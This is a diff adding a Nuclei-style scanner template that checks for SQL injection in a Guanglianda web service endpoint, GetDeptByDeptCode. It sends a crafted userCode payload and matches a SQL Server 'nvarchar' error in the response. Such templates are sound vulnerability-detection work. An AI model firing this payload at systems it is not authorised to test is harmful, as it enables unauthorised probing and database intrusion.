@@ -1,0 +1,24 @@
+id: guanglianda-GetDeptByDeptCode-sqli
+
+info:
+  name: guanglianda-GetDeptByDeptCode-sqli
+  author: guanglianda-GetDeptByDeptCode-sqli
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /org/service/Service.asmx/GetDeptByDeptCode?userCode=1%27-1/user--%27&EncryptData=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
+        Connection: close
+        Accept-Encoding: gzip, deflate
+
+    
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"nvarchar")
